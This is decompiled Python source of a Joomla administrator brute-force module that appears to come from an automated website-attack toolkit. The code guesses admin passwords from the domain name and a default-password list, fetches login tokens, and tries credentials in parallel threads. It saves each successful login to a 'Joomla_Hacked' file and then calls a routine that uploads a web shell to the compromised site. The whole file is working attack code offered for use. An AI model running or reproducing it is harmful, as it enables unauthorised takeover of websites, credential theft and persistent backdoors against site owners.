# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: BruteForce\Joomla.py
import requests
import re
import threading
import time
from Exploits import printModule
from Tools import shellupload
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}
passwords = open('files/DefaultPasswords_Joomla.txt', 'r').read().splitlines()

class JooMLaBruteForce(object):

    def __init__(self):
        self.flag = 0

    def Run(self, site):
        username = str(site)
        if 'www.' in site:
            username = username.replace('www.', '')
        else:
            username = site
        if '/' in site:
            username = username.split('/')[0]
        else:
            username = username
        if '.' in username:
            username = username.split('.')[0]
        users = [
         'admin', str(username), 'demo', 'test', 'test1']
        passwords_admin = [str(username), str(username) + '123', str(username) + '12', str(username) + '1']
        passwords_other = [str(username), str(username) + '123', str(username) + '12', str(username) + '1',
         'demo', 'test', 'test1']
        for password in passwords:
            passwords_admin.append(password)

        for user in users:
            if self.flag == 1:
                break
            if user == 'admin':
                thread = []
                for password in passwords_admin:
                    t = threading.Thread(target=self.Joomla, args=(site, user, password))
                    t.start()
                    thread.append(t)
                    time.sleep(0.7)
                    if self.flag == 1:
                        break

                for j in thread:
                    j.join()

            else:
                thread = []
                for password in passwords_other:
                    t = threading.Thread(target=self.Joomla, args=(site, user, password))
                    t.start()
                    thread.append(t)
                    time.sleep(0.7)
                    if self.flag == 1:
                        break

                for j in thread:
                    j.join()

        if self.flag == 0:
            return printModule.returnNo(site, 'N/A', 'Joomla Bruteforce', 'Joomla')
        else:
            return printModule.returnYes(site, 'N/A', 'Joomla Bruteforce', 'Joomla')

    def Joomla(self, site, user, passwd):
        try:
            sess = requests.session()
            GetToken = sess.get('http://' + site + '/administrator/index.php', timeout=7, headers=Headers)
            try:
                ToKeN = re.findall('type="hidden" name="(.*)" value="1"', str(GetToken.text))[0]
                GeTOPtIoN = re.findall('type="hidden" name="option" value="(.*)"', str(GetToken.content))[0]
            except:
                ToKeN = ''
                GeTOPtIoN = 'com_login'

            try:
                ret = re.findall('<input type="hidden" name="return" value="(.*)"/>', str(GetToken.content))[0]
            except:
                ret = ''

            post = {}
            if ret != '':
                post['return'] = ret
            post['username'] = user
            post['passwd'] = passwd
            post['lang'] = 'en-GB'
            post['option'] = GeTOPtIoN
            post['task'] = 'login'
            post[ToKeN] = '1'
            url = 'http://' + site + '/administrator/index.php'
            GoT = sess.post(url, data=post, headers=Headers, timeout=7)
            if 'logout' in str(GoT.content) and 'user.edit' in str(GoT.content):
                with open('result/Joomla_Hacked.txt', 'a') as writer:
                    writer.write('http://' + site + '/administrator/index.php' + '\n Username: {}'.format(user) + '\n Password: ' + passwd + '\n-----------------------------------------\n')
                shellupload.UploadShellJoomla(site, sess)
                self.flag = 1
        except:
            pass